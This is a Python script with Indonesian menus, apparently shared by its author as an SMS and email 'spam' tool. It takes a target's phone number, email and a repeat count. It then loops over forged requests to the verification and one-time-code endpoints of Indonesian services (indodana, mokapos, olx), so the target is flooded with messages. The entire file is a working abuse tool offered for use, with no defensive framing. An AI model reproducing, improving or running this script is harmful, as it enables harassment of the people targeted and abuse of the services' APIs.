try:
	import os,sys,time,requests,json
	from colorama import Fore,Back,init
except ModuleNotFoundError:
	print (f"{W}[{R}!{W}]Kamu Belum Install Module")
	print (f"Ketik{R}:{W} pip install requests && pip install colorama {R}! !")

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
ua=requests.get('http://xenzi-ganz.6te.net/User-Agent.php').text
localtime=time.asctime(time.localtime(time.time()))

Hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def udah():
	udah=input("Back To Menu? (y or n): ")
	if udah == "y" or udah == "Y":
		os.system("python dana.py")
	if udah == "n" or udah == "N":
		sys.exit(f"{W}[{R}!{W}] Makasih Sudah Gunain Sc Aing Sluur")

def logo1():
	os.system("clear")
	print (f"""
        {ungu}╔═╗{W}┌─┐┌─┐┌┬┐   {ungu}╔═╗{W} ┌┬┐ {biru}╔═╗{W} ┬ ┬
        {ungu}╚═╗{W}├─┘├─┤│││{R}───{ungu}║ ╦{W} │││ {biru}╠═╣{W} │ │
        {ungu}╚═╝{W}┴  ┴ ┴┴ ┴   {ungu}╚═╝{W} ┴ ┴ {biru}╩ ╩{W} ┴ ┴─┘

           {R}-{W} Creator{R}:{W} AmmarBN
           {R}-{W} Youtube{R}:{W} Ammar Executed

         {Y}•{W}  Note{R}:{W} Masukkan Nomor Jika Ingin Spam Sms
         {Y}•{W}  Your Ip{R}:{W} {ip}
         {Y}•{W}  Bahasa Tools{R}:{W} {ua}

""")

def logo():
	print (f"""
	{ungu}╔═╗{W}┌─┐┌─┐┌┬┐   {ungu}╔═╗{W} ┌┬┐ {biru}╔═╗{W} ┬ ┬
	{ungu}╚═╗{W}├─┘├─┤│││{R}───{ungu}║ ╦{W} │││ {biru}╠═╣{W} │ │
	{ungu}╚═╝{W}┴  ┴ ┴┴ ┴   {ungu}╚═╝{W} ┴ ┴ {biru}╩ ╩{W} ┴ ┴─┘

	   {R}-{W} Creator{R}:{W} AmmarBN
	   {R}-{W} Youtube{R}:{W} Ammar Executed

	 {Y}•{W}  Note{R}:{W} Masukkan Nomor Jika Ingin Spam Sms
	 {Y}•{W}  Your Ip{R}:{W} {ip}
	 {Y}•{W}  Bahasa Tools{R}:{W} {ua}

       {W}1{R}.{W} Gaskeun Spam {ungu}Email
       {W}2{R}.{W} Laporkan {R}Bug
       {W}3{R}.{W} Support Admin
       {W}4{R}.{W} Keluar
""")

try:
	os.system("clear")
	logo()
	tanya=input(f"  {R} > {W}Pilih: ")
except KeyboardInterrupt:
	print (f"{W}[{G}✓{W}] Program Dihentikan")
except ValueError:
	print (f"{W}[{R}!{W}] Masukin Yang Benar Sluur")


def api():
	logo1()
	mail2 = input(f"{W}[{R}•{W}] Nomor: ")
	mail = input(f"{W}[{R}•{W}] Email Nmr-y: ")
	jumlah = input(f"{W}[{R}•{W}] Jumlah Spam: ")
	for i in range(int(jumlah)):
		dat={"Host":"api.indodana.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.indodana.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.indodana.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		dat2=json.dumps({"email":mail})
		req=requests.post("https://api.indodana.com/services/athena/download-app/email",headers=dat,data=dat2).text
		if "success" in req:
			print (f"{W}[{Y}{localtime}{W}] {W}[{G}✓{W}] Sukses Spam Gmail")
		else:
			print (f"{W}[{Y}{localtime}{W}] {W}[{R}×{W}] Gagal Spam Gmail")
	
		moka={"Host":"service-goauth.mokapos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://backoffice.mokapos.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://backoffice.mokapos.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		ata=json.dumps({"phone_number":"+62"+mail2})
		gas=requests.post("https://service-goauth.mokapos.com/account/v1/verification/phone/send",headers=moka,data=ata).text
		print (f"{W}[{Y}{localtime}{W}] {W}[{G}✓{W}] Sukses Spam Sms")
	
		olx={"Host":"www.olx.co.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","save-data":"on","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		olx2=json.dumps({"grantType":"email","email":mail,"language":"id"})
		olx3=requests.post("https://www.olx.co.id/api/auth/authenticate",headers=olx,data=olx2).text
		if "PENDING" in olx3:
			print (f"{W}[{Y}{localtime}{W}] {W}[{G}✓{W}] Sukses Spam Gmail")
		else:
			print (f"{W}[{Y}{localtime}{W}] {W}[{R}×{W}] Gagal Spam Gmail")


try:
	if tanya == "1":
		api()
		udah()
	if tanya == "2":
		os.system("xdg-open https://wa.me/628822968?text=*Report:* ")
		udah()
	if tanya == "3":
		logo1()
		os.system("xdg-open https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ")
		udah()
	if tanya == "4":
		sys.exit(f"{W}[{R}!{W}] Makasih Sudah Gunain Sc Aing Sluur")
except ValueError:
	print (f"{W}[{R}!{W}] Masukin Yang Benar Sluur")
